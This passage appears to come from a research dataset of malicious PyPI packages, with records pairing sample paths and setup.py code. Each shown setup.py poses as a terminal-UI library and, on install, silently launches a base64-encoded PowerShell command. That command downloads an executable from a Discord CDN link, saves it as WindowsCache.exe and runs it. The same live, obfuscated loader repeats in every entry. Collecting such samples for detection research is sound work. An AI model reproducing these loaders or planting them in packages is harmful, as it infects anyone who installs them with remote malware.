Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pingvisarandom-v8.90",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pingvisarandom',\n    packages = ['modlib'],\n    version = '9.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-piposintpaypal-v7.44",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-piposintpaypal',\n    packages = ['modlib'],\n    version = '4.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pipsuperad-v3.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pipsuperad',\n    packages = ['modlib'],\n    version = '7.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pongedgame-v3.88",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pongedgame',\n    packages = ['modlib'],\n    version = '1.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-proofrandomcandy-v5.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-proofrandomcandy',\n    packages = ['modlib'],\n    version = '3.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-proofrandvisa-v8.21",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-proofrandvisa',\n    packages = ['modlib'],\n    version = '1.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pushpullsuper-v6.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pushpullsuper',\n    packages = ['modlib'],\n    version = '3.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pynvidiasplit-v6.8",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pynvidiasplit',\n    packages = ['modlib'],\n    version = '3.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pywposthacked-v7.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pywposthacked',\n    packages = ['modlib'],\n    version = '2.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pywvisakill-v10.7",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pywvisakill',\n    packages = ['modlib'],\n    version = '2.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-randcpustr-v5.42",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-randcpustr',\n    packages = ['modlib'],\n    version = '3.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-reguipong-v7.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-reguipong',\n    packages = ['modlib'],\n    version = '1.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-splitstudystring-v3.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-splitstudystring',\n    packages = ['modlib'],\n    version = '3.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-strnvidiamine-v6.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-strnvidiamine',\n    packages = ['modlib'],\n    version = '4.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: 